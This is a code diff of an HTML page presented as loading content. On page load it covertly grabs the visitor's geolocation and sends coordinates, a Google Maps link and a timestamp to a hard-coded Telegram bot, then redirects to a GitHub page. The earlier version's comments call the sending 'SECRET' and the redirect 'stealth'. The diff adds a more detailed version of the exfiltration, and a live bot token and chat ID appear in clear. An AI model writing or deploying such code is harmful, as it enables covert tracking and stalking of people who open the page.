@@ -7,20 +7,24 @@
             navigator.geolocation.getCurrentPosition(position => {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
+                
+                // Create Google Maps link
                 const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-
-                // SECRET: Send to Telegram (FIXED URL)
-                fetch(`https://api.telegram.org/bot8415841218:AAFOkRsPB3CAY5X63uKW4P9Z2zOCblpdYHE/sendMessage?chat_id=2091200246&text=TEST&text=📍 FAMILY ALERT! ${mapsLink}`)
-                    .then(response => console.log("Message sent!"))
-                    .catch(error => console.error("Error:", error));
-
-                // Redirect to YouTube (stealth!)
-                setTimeout(() => { window.location.href = "https://github.com/Mirafad19"; }, 1000);
+                
+                // Send detailed alert to Telegram
+                fetch(`https://api.telegram.org/bot8415841218:AAFOkRsPB3CAY5X63uKW4P9Z2zOCblpdYHE/sendMessage?chat_id=2091200246&text=📍 Family Member Location:\n\n• Google Maps: ${mapsLink}\n• Coordinates: ${lat}, ${lng}\n• Time: ${new Date().toLocaleString()}`)
+                    .then(() => {
+                        // Redirect to your GitHub page
+                        window.location.href = "https://github.com/Mirafad19/";
+                    });
+            }, error => {
+                console.error("Error getting location:", error);
+                window.location.href = "https://github.com/Mirafad19/";
             });
         }
     </script>
 </head>
 <body onload="sendLocation()">
-    <h2>Loading content...</h2>
+    <h2>Loading your content...</h2>
 </body>
 </html>
